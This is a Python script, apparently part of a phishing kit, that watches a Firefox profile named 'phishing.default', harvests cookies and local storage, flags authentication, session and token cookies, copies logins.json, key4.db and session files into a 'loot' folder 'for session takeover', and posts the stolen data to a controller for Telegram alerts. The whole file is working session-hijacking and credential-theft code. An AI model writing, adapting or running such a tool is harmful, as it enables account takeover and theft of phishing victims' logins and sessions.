#!/usr/bin/env python3
"""
Cookie Monitor - Watches Firefox profile for cookies and session data
Sends updates to the controller for Telegram notifications
"""

import os
import sys
import time
import json
import sqlite3
import shutil
import requests
import hashlib
from pathlib import Path
from datetime import datetime

# Try to import lz4 for Firefox 4+ cookie decompression
try:
    import lz4.block
    HAS_LZ4 = True
except ImportError:
    HAS_LZ4 = False

PROFILE_DIR = Path("/root/.mozilla/firefox/phishing.default")
LOOT_DIR = Path("/app/loot")
CONTROLLER_URL = os.environ.get("CONTROLLER_URL", "http://controller:5000")
SESSION_ID = os.environ.get("SESSION_ID", "session_1")
CHECK_INTERVAL = 10  # seconds

# Track what we've already sent
sent_cookies_hash = ""
sent_credentials = set()


def get_firefox_cookies():
    """Extract cookies from Firefox's cookies.sqlite"""
    cookies = []
    cookies_db = PROFILE_DIR / "cookies.sqlite"
    
    if not cookies_db.exists():
        return cookies
    
    # Copy database to avoid locking issues
    temp_db = Path("/tmp/cookies_copy.sqlite")
    try:
        shutil.copy2(cookies_db, temp_db)
        
        conn = sqlite3.connect(str(temp_db))
        cursor = conn.cursor()
        
        cursor.execute("""
            SELECT host, name, value, path, expiry, isSecure, isHttpOnly, sameSite
            FROM moz_cookies
        """)
        
        for row in cursor.fetchall():
            cookies.append({
                "domain": row[0],
                "name": row[1],
                "value": row[2],
                "path": row[3],
                "expiry": row[4],
                "secure": bool(row[5]),
                "httpOnly": bool(row[6]),
                "sameSite": row[7]
            })
        
        conn.close()
    except Exception as e:
        print(f"Error reading cookies: {e}", file=sys.stderr)
    finally:
        if temp_db.exists():
            temp_db.unlink()
    
    return cookies


def get_session_storage():
    """Extract session storage data from Firefox"""
    sessions = {}
    storage_dir = PROFILE_DIR / "storage" / "default"
    
    if not storage_dir.exists():
        return sessions
    
    for site_dir in storage_dir.iterdir():
        if site_dir.is_dir():
            ls_file = site_dir / "ls" / "data.sqlite"
            if ls_file.exists():
                try:
                    temp_db = Path("/tmp/ls_copy.sqlite")
                    shutil.copy2(ls_file, temp_db)
                    
                    conn = sqlite3.connect(str(temp_db))
                    cursor = conn.cursor()
                    
                    cursor.execute("SELECT key, value FROM data")
                    site_data = {}
                    for key, value in cursor.fetchall():
                        # Decode if bytes
                        if isinstance(value, bytes):
                            try:
                                value = value.decode('utf-8')
                            except:
                                value = value.hex()
                        site_data[key] = value
                    
                    if site_data:
                        sessions[site_dir.name] = site_data
                    
                    conn.close()
                    temp_db.unlink()
                except Exception as e:
                    print(f"Error reading session storage: {e}", file=sys.stderr)
    
    return sessions


def export_profile():
    """Export the entire Firefox profile for session takeover"""
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    export_dir = LOOT_DIR / SESSION_ID / f"profile_{timestamp}"
    export_dir.mkdir(parents=True, exist_ok=True)
    
    # Copy important profile files
    important_files = [
        "cookies.sqlite",
        "places.sqlite",
        "formhistory.sqlite",
        "logins.json",
        "key4.db",
        "cert9.db",
        "sessionstore.jsonlz4",
        "sessionstore-backups"
    ]
    
    for item in important_files:
        src = PROFILE_DIR / item
        if src.exists():
            dst = export_dir / item
            try:
                if src.is_dir():
                    shutil.copytree(src, dst)
                else:
                    shutil.copy2(src, dst)
            except Exception as e:
                print(f"Error copying {item}: {e}", file=sys.stderr)
    
    return str(export_dir)


def send_to_controller(data_type, data):
    """Send data to the controller for processing and Telegram alerts"""
    try:
        payload = {
            "session_id": SESSION_ID,
            "type": data_type,
            "timestamp": datetime.now().isoformat(),
            "data": data
        }
        
        response = requests.post(
            f"{CONTROLLER_URL}/api/report",
            json=payload,
            timeout=5
        )
        return response.status_code == 200
    except Exception as e:
        print(f"Error sending to controller: {e}", file=sys.stderr)
        return False


def check_for_interesting_cookies(cookies):
    """Check if cookies contain authentication tokens"""
    interesting_patterns = [
        "session", "auth", "token", "sid", "ssid", 
        "login", "user", "jwt", "access", "refresh",
        "oauth", "saml", "sso", "credential"
    ]
    
    interesting = []
    for cookie in cookies:
        name_lower = cookie["name"].lower()
        for pattern in interesting_patterns:
            if pattern in name_lower:
                interesting.append(cookie)
                break
    
    return interesting


def main():
    global sent_cookies_hash
    
    print(f"Cookie monitor started for session {SESSION_ID}")
    print(f"Monitoring profile: {PROFILE_DIR}")
    print(f"Loot directory: {LOOT_DIR}")
    
    # Ensure loot directory exists
    (LOOT_DIR / SESSION_ID).mkdir(parents=True, exist_ok=True)
    
    # Initial notification
    send_to_controller("session_start", {"status": "monitoring"})
    
    while True:
        try:
            # Get current cookies
            cookies = get_firefox_cookies()
            
            if cookies:
                # Check if cookies changed
                cookies_hash = hashlib.md5(
                    json.dumps(cookies, sort_keys=True).encode()
                ).hexdigest()
                
                if cookies_hash != sent_cookies_hash:
                    sent_cookies_hash = cookies_hash
                    
                    # Save cookies to loot
                    cookies_file = LOOT_DIR / SESSION_ID / "cookies.json"
                    with open(cookies_file, "w") as f:
                        json.dump(cookies, f, indent=2)
                    
                    # Check for interesting cookies
                    interesting = check_for_interesting_cookies(cookies)
                    
                    if interesting:
                        print(f"Found {len(interesting)} interesting cookies!")
                        send_to_controller("auth_cookies", {
                            "count": len(interesting),
                            "cookies": interesting,
                            "total_cookies": len(cookies)
                        })
                        
                        # Export full profile on auth detection
                        profile_path = export_profile()
                        send_to_controller("profile_exported", {
                            "path": profile_path
                        })
                    else:
                        send_to_controller("cookies_update", {
                            "count": len(cookies)
                        })
            
            # Get session storage
            sessions = get_session_storage()
            if sessions:
                sessions_file = LOOT_DIR / SESSION_ID / "sessions.json"
                with open(sessions_file, "w") as f:
                    json.dump(sessions, f, indent=2)
            
        except Exception as e:
            print(f"Monitor error: {e}", file=sys.stderr)
        
        time.sleep(CHECK_INTERVAL)


if __name__ == "__main__":
    main()
